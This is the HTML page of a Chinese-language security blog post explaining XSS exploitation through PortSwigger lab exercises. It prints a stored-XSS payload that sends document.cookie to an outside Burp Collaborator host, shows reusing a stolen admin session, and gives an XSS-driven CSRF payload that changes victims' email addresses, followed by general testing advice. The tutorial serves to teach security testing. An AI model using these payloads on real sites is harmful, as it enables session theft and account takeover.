@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>XSS 漏洞知解 123</title>
+
+  
+  
+
+
+
+
+
+  
+  <meta name="author" content="Neal" />
+  <meta name="description" content="跨站脚本攻击（Cross-Site Scripting），为了避免与 CSS 混淆，一般简称为 XSS。XSS 作为一种典型的主要可以分为 3 种：
+ 反射型 XSS 存储型 XSS DOM 型 XSS  关于这 3 种 XSS 类型的区别，在这就不展开了，本文主要讲解 XSS 漏洞的利用场景以及如何测试反射型 XSS，当然反射型 XSS 漏洞的测试和其它 XSS 漏洞类型的测试存在很多共同之处的。通常来说，通过 XSS 漏洞攻击者可以在受害者机器上执行任何脚本的话，包括：
+ 可以执行受害者可以执行的任何操作 可以浏览受害者可以浏览的任何内容 可以修改受害者可以修改的任何信息 可以通过最初的受害者与应用中其他用户交互，从而发起对其他用户的攻击  不过值得注意的是，反射型 XSS 总漏洞利用过程中也会遇到较多的障碍，经常可能会遇到很多限制：
+ cookie 设置为 httponly，无法通过 JS 直接操控 cookie 用户输入的内容被进行过滤或者编码 受害者可能并没有登录应用，或者应用用户会话与特定的因素有绑定关系，比如 IP 地址或者 MAC 地址，这种情况比较少见  典型利用场景 XSS 的利用场景其实是五花八门的，可以说只要你敢想，搞不好你就可以做得到。这里，我们可以选择两个最典型的利用场景进行讲解。在这里我主要使用 PortSwigger 的应用安全学院里面的 lab 进行讲解。
+盗取 cookie 通过 XSS 漏洞盗取 cookie 可以说是最典型的利用场景了。不过现在随着 HttpOnly 的广泛应用，这一利用场景也产生了一些限制。但是 HttpOnly 也并不能完全保证 XSS 漏洞的防范，因为 HttpOnly 理论上应该覆盖所有的敏感 cookie，如果有一处没有覆盖到，就有被攻击的可能性。另外一方面，通过结合 CORS 也有突破限制的可能性。还有一个实际情况是，仍然有很多应用并没有使用 HttpOnly，本节也主要是针对这一情形的具体利用。" />
+
+  
+  
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@gohugoio" />
+    <meta name="twitter:title" content="XSS 漏洞知解 123" />
+    <meta name="twitter:description" content="跨站脚本攻击（Cross-Site Scripting），为了避免与 CSS 混淆，一般简称为 XSS。XSS 作为一种典型的主要可以分为 3 种：
+ 反射型 XSS 存储型 XSS DOM 型 XSS  关于这 3 种 XSS 类型的区别，在这就不展开了，本文主要讲解 XSS 漏洞的利用场景以及如何测试反射型 XSS，当然反射型 XSS 漏洞的测试和其它 XSS 漏洞类型的测试存在很多共同之处的。通常来说，通过 XSS 漏洞攻击者可以在受害者机器上执行任何脚本的话，包括：
+ 可以执行受害者可以执行的任何操作 可以浏览受害者可以浏览的任何内容 可以修改受害者可以修改的任何信息 可以通过最初的受害者与应用中其他用户交互，从而发起对其他用户的攻击  不过值得注意的是，反射型 XSS 总漏洞利用过程中也会遇到较多的障碍，经常可能会遇到很多限制：
+ cookie 设置为 httponly，无法通过 JS 直接操控 cookie 用户输入的内容被进行过滤或者编码 受害者可能并没有登录应用，或者应用用户会话与特定的因素有绑定关系，比如 IP 地址或者 MAC 地址，这种情况比较少见  典型利用场景 XSS 的利用场景其实是五花八门的，可以说只要你敢想，搞不好你就可以做得到。这里，我们可以选择两个最典型的利用场景进行讲解。在这里我主要使用 PortSwigger 的应用安全学院里面的 lab 进行讲解。
+盗取 cookie 通过 XSS 漏洞盗取 cookie 可以说是最典型的利用场景了。不过现在随着 HttpOnly 的广泛应用，这一利用场景也产生了一些限制。但是 HttpOnly 也并不能完全保证 XSS 漏洞的防范，因为 HttpOnly 理论上应该覆盖所有的敏感 cookie，如果有一处没有覆盖到，就有被攻击的可能性。另外一方面，通过结合 CORS 也有突破限制的可能性。还有一个实际情况是，仍然有很多应用并没有使用 HttpOnly，本节也主要是针对这一情形的具体利用。" />
+    <meta name="twitter:image" content="https://madneal.com/img/avatar.jpg" />
+  
+
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="XSS 漏洞知解 123" />
+  <meta property="og:description" content="跨站脚本攻击（Cross-Site Scripting），为了避免与 CSS 混淆，一般简称为 XSS。XSS 作为一种典型的主要可以分为 3 种：
+ 反射型 XSS 存储型 XSS DOM 型 XSS  关于这 3 种 XSS 类型的区别，在这就不展开了，本文主要讲解 XSS 漏洞的利用场景以及如何测试反射型 XSS，当然反射型 XSS 漏洞的测试和其它 XSS 漏洞类型的测试存在很多共同之处的。通常来说，通过 XSS 漏洞攻击者可以在受害者机器上执行任何脚本的话，包括：
+ 可以执行受害者可以执行的任何操作 可以浏览受害者可以浏览的任何内容 可以修改受害者可以修改的任何信息 可以通过最初的受害者与应用中其他用户交互，从而发起对其他用户的攻击  不过值得注意的是，反射型 XSS 总漏洞利用过程中也会遇到较多的障碍，经常可能会遇到很多限制：
+ cookie 设置为 httponly，无法通过 JS 直接操控 cookie 用户输入的内容被进行过滤或者编码 受害者可能并没有登录应用，或者应用用户会话与特定的因素有绑定关系，比如 IP 地址或者 MAC 地址，这种情况比较少见  典型利用场景 XSS 的利用场景其实是五花八门的，可以说只要你敢想，搞不好你就可以做得到。这里，我们可以选择两个最典型的利用场景进行讲解。在这里我主要使用 PortSwigger 的应用安全学院里面的 lab 进行讲解。
+盗取 cookie 通过 XSS 漏洞盗取 cookie 可以说是最典型的利用场景了。不过现在随着 HttpOnly 的广泛应用，这一利用场景也产生了一些限制。但是 HttpOnly 也并不能完全保证 XSS 漏洞的防范，因为 HttpOnly 理论上应该覆盖所有的敏感 cookie，如果有一处没有覆盖到，就有被攻击的可能性。另外一方面，通过结合 CORS 也有突破限制的可能性。还有一个实际情况是，仍然有很多应用并没有使用 HttpOnly，本节也主要是针对这一情形的具体利用。" />
+  <meta property="og:url" content="https://madneal.com/post/%E5%8F%8D%E5%B0%84%E6%80%A7xss%E7%9F%A5%E8%A7%A3123/" />
+  <meta property="og:image" content="https://madneal.com/img/avatar.jpg" />
+
+
+
+
+<meta name="generator" content="Hugo 0.46" />
+
+
+<link rel="canonical" href="https://madneal.com/post/%E5%8F%8D%E5%B0%84%E6%80%A7xss%E7%9F%A5%E8%A7%A3123/" />
+<link rel="alternative" href="https://madneal.com/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta content="xss, web安全, 渗透测试, 反射型XSS, 存储型XSS" name="keywords">
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
+<meta name="msvalidate.01" content="22596E34341DD1D17D6022C44647E587" />
+
+
+
+
+
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog" />
+<meta name="msapplication-tooltip" content="Neal&#39;s Blog" />
+<meta name='msapplication-navbutton-color' content="#5fbf5e" />
+<meta name="msapplication-TileColor" content="#5fbf5e" />
+<meta name="msapplication-TileImage" content="/img/tile-image-windows.png" />
+<link rel="icon" href="https://madneal.com/img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://madneal.com/img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://madneal.com/img/favicon-32x32.png" />
+<link rel="icon" sizes="192x192" href="https://madneal.com/img/touch-icon-android.png" />
+<link rel="apple-touch-icon" href="https://madneal.com/img/touch-icon-apple.png" />
+<link rel="mask-icon" href="https://madneal.com/img/safari-pinned-tab.svg" color="#5fbf5e" />
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
+
+<link rel="stylesheet" href="https://madneal.com/css/bundle.css" />
+
+
+  
+  <!--[if lt IE 9]>
+    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
+  <![endif]-->
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+
+<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>
+
+
+</head>
+  <body>
+    
+    <div class="suspension">
+      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
+      
+        
+        <a title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment"></span></a>
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <img class="avatar" src="https://madneal.com/img/avatar.jpg" alt="Avatar">
+  
+  <h2 class="title">Neal&#39;s Blog</h2>
+  
+  <p class="subtitle">Development &amp; Security</p>
+  <button class="menu-toggle" type="button">
+    <span class="icon icon-menu"></span>
+  </button>
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+            
+            
+            
+              is-active
+            ">
+            <a href="https://madneal.com/">Home</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://github.com/neal1991">Works</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://madneal.com/tags/">Tags</a>
+          </li>
+      
+    </ul>
+  </nav>
+  <img src="https://madneal.com/img/wechat.jpg" alt="wechat" style="width: 240px;height: 240px;">
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list">
+
+      
+      <li class="social-item">
+        <a href="mailto:bing.ecnu@gmail.com" title="Email"><span class="icon icon-email"></span></a>
+      </li>
+
+      
+      <li class="social-item">
+        <a href="//github.com/neal1991" title="GitHub"><span class="icon icon-github"></span></a>
+      </li>
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <li class="social-item">
+        <a href="https://madneal.com/img/wechat.jpg" title="Wechat"><span class="icon icon-wechat"></span></a>
+      </li>
+
+      
+
+      
+
+      
+
+      
+
+      <li class="social-item">
+        <a href="https://madneal.com/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
+      </li>
+
+    </ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">XSS 漏洞知解 123</h1>
+      <p class="post-meta">@Neal · Jan 4, 2020 · 2 min read</p>
+    </header>
+    <article class="post-content">
+
+<p>跨站脚本攻击（Cross-Site Scripting），为了避免与 CSS 混淆，一般简称为 XSS。XSS 作为一种典型的主要可以分为 3 种：</p>
+
+<ul>
+<li>反射型 XSS</li>
+<li>存储型 XSS</li>
+<li>DOM 型 XSS</li>
+</ul>
+
+<p>关于这 3 种 XSS 类型的区别，在这就不展开了，本文主要讲解 XSS 漏洞的利用场景以及如何测试反射型 XSS，当然反射型 XSS 漏洞的测试和其它 XSS 漏洞类型的测试存在很多共同之处的。通常来说，通过 XSS 漏洞攻击者可以在受害者机器上执行任何脚本的话，包括：</p>
+
+<ul>
+<li>可以执行受害者可以执行的任何操作</li>
+<li>可以浏览受害者可以浏览的任何内容</li>
+<li>可以修改受害者可以修改的任何信息</li>
+<li>可以通过最初的受害者与应用中其他用户交互，从而发起对其他用户的攻击</li>
+</ul>
+
+<p>不过值得注意的是，反射型 XSS 总漏洞利用过程中也会遇到较多的障碍，经常可能会遇到很多限制：</p>
+
+<ul>
+<li>cookie 设置为 httponly，无法通过 JS 直接操控 cookie</li>
+<li>用户输入的内容被进行过滤或者编码</li>
+<li>受害者可能并没有登录应用，或者应用用户会话与特定的因素有绑定关系，比如 IP 地址或者 MAC 地址，这种情况比较少见</li>
+</ul>
+
+<h2 id="典型利用场景">典型利用场景</h2>
+
+<p>XSS 的利用场景其实是五花八门的，可以说只要你敢想，搞不好你就可以做得到。这里，我们可以选择两个最典型的利用场景进行讲解。在这里我主要使用 PortSwigger 的应用安全学院里面的 lab 进行讲解。</p>
+
+<h3 id="盗取-cookie">盗取 cookie</h3>
+
+<p>通过 XSS 漏洞盗取 cookie 可以说是最典型的利用场景了。不过现在随着 HttpOnly 的广泛应用，这一利用场景也产生了一些限制。但是 HttpOnly 也并不能完全保证 XSS 漏洞的防范，因为 HttpOnly 理论上应该覆盖所有的敏感 cookie，如果有一处没有覆盖到，就有被攻击的可能性。另外一方面，通过结合 CORS 也有突破限制的可能性。还有一个实际情况是，仍然有很多应用并没有使用 HttpOnly，本节也主要是针对这一情形的具体利用。</p>
+
+<p>假设有一个博客平台，目前我们已经发现博文的评论处存在存储型 XSS 漏洞。那么如果其它用户打开这一篇博文，就可以通过这个漏洞让这名用户执行任意 JS 脚本，基本上就可以进行任何操作。如果这一名用户是管理员的话，那么危害性就更大，理论上这个管理用在这个博客可以执行的任何操作，攻击者都可以实现。这个攻击场景主要分为三步：</p>
+
+<ol>
+<li>攻击者创建一个 Web 服务，需要保证受害者和这个服务之间是连通的。</li>
+<li>注入 XSS 的 payload，实现通过 JS 获取受害者 cookie，并发送给攻击者创建的服务</li>
+<li>攻击者通过获取的 cookie 则可以成为应用的合法用户并执行任何操作</li>
+</ol>
+
+<p>创建 web 服务非常简单，可以使用 python 命令既可以创建服务，<code>python -m SimpleHTTPServer 80</code>。这样就可以指定一个监听 80 端口的 web 服务。其实 Burp 提供了一个非常实用的利用功能，通过 Burp Collobrator Client 就可以创建一个开放在外网的 web 服务，这样如果你在日常测试中，就无须自己准备一个带有固定 IP 的服务器来创建服务了。</p>
+
+<p><img src="https://s2.ax1x.com/2020/02/19/3ExZJH.png" alt="3ExZJH.png" /></p>
+
+<p><img src="https://s2.ax1x.com/2020/02/19/3Exlef.png" alt="3Exlef.png" /></p>
+
+<p>进入到 Collobrator Client，点击 Copy to clipborad 就可以将服务地址复制到剪切板。我们可以使用 curl 来进行测试：</p>
+
+<p><img src="https://s2.ax1x.com/2020/02/25/3tuMAU.gif" alt="3tuMAU.gif" /></p>
+
+<p>我们可以看到在 client 中可以看到 DNS 请求以及相应的 HTTP 请求，这样通过 Collobrator Client 就不需要在外网自己的服务器下搭建服务。让我们继续重现上面的利用过程，首先我们先准备好要利用的 XSS 的 payload：</p>
+
+<pre><code>&lt;script&gt;
+fetch('https://d8mzva8z7ou9zrnqkgz49jltyk4asz.burpcollaborator.net',{
+    method: 'POST',
+    mode: 'no-cors',
+    body: document.cookie
+})
+&lt;/script&gt;
+</code></pre>
+
+<p>然后我们只需要在 Collobrator Client 等待请求过来，不出意外的话，我们可以看到 administrator 的 cookie。</p>
+
+<p><img src="https://s2.ax1x.com/2020/02/27/3ax38K.png" alt="3ax38K.png" /></p>
+
+<p>下面我们只需要打开浏览器开发者工具，总控制台中输入 <code>document.cookie = 'session=Xn8ow3pdmd6LWktVZPJtBlI9yKzIKUX3'</code>，刷新一下页面，我们就成为管理员了。</p>
+
+<p><img src="https://s2.ax1x.com/2020/02/27/3axGvD.png" alt="3axGvD.png" /></p>
+
+<h3 id="通过-xss-来实现-csrf">通过 XSS 来实现 CSRF</h3>
+
+<p>上述的攻击手法有一定的限制之处，而且容易被受害者发现。而配合 CSRF 漏洞，攻击者可以实现执行受害者可以执行的任何操作，并且隐秘性更强。比如我们可以修改用户的邮箱，从而可以充值用户密码。如果受害者是管理员的话，甚至往往可以实现添加用户，删除用户。CSRF 漏洞的防御机制一般是通过 token 来进行防御，但是如果你的应用有 XSS 漏洞，那么这种防御机制就会失效，因为通过 JS 我们就可以获取 token。下面继续通过一个 lab 来演示这种类型的攻击方式：</p>
+
+<p>这个 lab 和之前的一样，这一次我们需要通过 XSS 漏洞来配合 CSRF 漏洞来实现修改受害者的邮箱。首先我们可以通过一个普通用户登录应用，然后发现有一个可以修改邮箱的功能。</p>
+
+<p><img src="https://s2.ax1x.com/2020/03/01/3cJFkq.png" alt="3cJFkq.png" /></p>
+
+<p>通过 Burp 可以捕获修改邮箱的请求：</p>
+
+<pre><code>POST /email/change-email HTTP/1.1
+Host: acee1f9f1f96dfe38027996900d70058.web-security-academy.net
+Connection: close
+Content-Length: 57
+Cache-Control: max-age=0
+Origin: https://acee1f9f1f96dfe38027996900d70058.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Sec-Fetch-Dest: document
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Referer: https://acee1f9f1f96dfe38027996900d70058.web-security-academy.net/email
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7,zh-TW;q=0.6
+Cookie: session=J7wtDYrnotYBeGxHRbxRQAjwWoER6iPb
+
+email=bbb%40bbb.com&amp;csrf=xmLrs2P4dtFVurZlCUVpJsBnvaGlL4T1
+</code></pre>
+
+<p>可以看到这个修改邮箱的请求包含两个参数，即 <code>email</code> 以及 <code>csrf</code>，很明显，这个请求是使用了 CSRF 防御的。那么现在可以思考一下如何来执行 CSRF。</p>
+
+<ol>
+<li>首先请求修改邮箱功能的页面，获取页面响应。</li>
+<li>在页面响应中匹配 csrf，然后提交修改邮箱的 POST 请求。</li>
+</ol>
+
+<p><img src="https://s2.ax1x.com/2020/03/01/3ctH0J.png" alt="3ctH0J.png" /></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">csrf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/name=&#34;csrf&#34; value=&#34;(\w+)&#34;/</span>)[<span style="color:#ae81ff">1</span>];
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">changeReq</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+    <span style="color:#a6e22e">changeReq</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;/email/change-email&#34;</span>, <span style="color:#66d9ef">true</span>);
+    <span style="color:#a6e22e">changeReq</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;csrf=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">csrf</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;email=hack@hack.com&#34;</span>);
+}
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;/email&#34;</span>, <span style="color:#66d9ef">true</span>)
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>()
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div>
+<p>只要把上述的 payload 提交到 comment 中，然后提交，就可以实现任何访问这个博客评论的用户都会成为受害者，将其邮箱修改为 <code>hack@hack.com</code>。</p>
+
+<h2 id="xss-漏洞的测试">XSS 漏洞的测试</h2>
+
+<p>接下来可以聊一聊如何测试 XSS 漏洞。不管是手工测试亦或是现在比较流行的被动扫描器的自动化类型的测试，其测试方式基本也是差不多的。</p>
+
+<ul>
+<li>测试每一个输入点，每一个 HTTP 请求的输入点都是可以进行测试的，包括 URL 中的参数，以及 BODY，其实 HTTP 头也可以进行测试，不过在实际中，通过请求头的参数来触发 XSS 漏洞的不是太常见。</li>
+<li>通过输入点提交随机字符串，这么多的目的主要是为了验证通过输入点的 payload 是否影响最终的响应。这里，其实对于自动化类型的测试还有一个小技巧，就是可以在随机字符串中可以去包含一些特殊符号，从而判断应用有没有对相应的符号进行转义，比如单引号、尖括号之类的。</li>
+<li>找到 payload 在响应中的上下文。这一点其实比较重要的，这关系到你该如何去利用 XSS 漏洞。因为输入点映射在不同的位置，会影响到漏洞的利用方式。比如你的输入点的 payload 可以对应于 HTML 标签中、HTML 标签中的属性，或者是映射到 JS 文件中，通过这些，你可以更好地知道如何去利用 XSS 漏洞。</li>
+<li>下面就是利用一些常见的 XSS payload 来进行测试，这里可以推荐 Burp 提供的 <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload</a>。里面对于不同的浏览器，不同的标签，甚至不同的属性，都有对应的 payload。当然，很有可能这些 payload 并不能直接成功，这个时候可能还需要结合上一点一起看一看来做相应的调整。不过这个 cheetsheet 里面可能已经足够了，可能还是最终没有找到合适的 payload。</li>
+</ul>
+
+<p>对于漏洞的验证，人工测试往往比较直观，大多数都是通过 <code>alert</code> 弹窗的形式来验证漏洞是否存在。而对于自动化的漏洞测试工具而言，对于 XSS 漏洞的验证方式可能就会稍微复杂一点，包括验证响应的 <code>Content-Type</code>，然后接着验证输入点的输入是如何作用于响应中，通过对响应的解析从而验证漏洞是否利用成功。另外还有一种方式是通过 headless 浏览器去实现，让后来监听弹窗事件，这种测试方式接近于人工测试，但也更加消耗时间和性能。</p>
+
+<h2 id="总结">总结</h2>
+
+<p>XSS 漏洞作为 Web 应用最为典型的漏洞之一，屡出不鲜。因为 XSS 的漏洞往往要考虑很多因素，包括转义、过滤、以及考虑到应用自身业务的需求，从而避免业务需求和防御需求的冲突。并且防御必须覆盖到应用的每一个输入点，即使仅有一个输入点存在漏洞，应用就存在被攻破的可能性。</p>
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting">https://portswigger.net/web-security/cross-site-scripting</a></li>
+</ul>
+</article>
+    <footer class="post-footer">
+        <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
+        <img src="https://s2.ax1x.com/2019/08/19/m1jSLd.jpg" alt="m1jSLd.jpg">
+      
+      <ul class="post-tags">
+        
+          <li><a href="https://madneal.com/tags/reflection-xss"><span class="tag">Reflection Xss</span></a></li>
+        
+          <li><a href="https://madneal.com/tags/xss"><span class="tag">Xss</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.
+      </p>
+    </footer>
+    
+      <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+      
+    
+  </section>
+  <footer class="site-footer">
+  <p>© 2017-2020 Neal&#39;s Blog</p>
+</footer>
+
+
+
+<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+<script src="https://madneal.com/js/bundle.js"></script>
+
+
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104405154-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+  </body>
+</html>
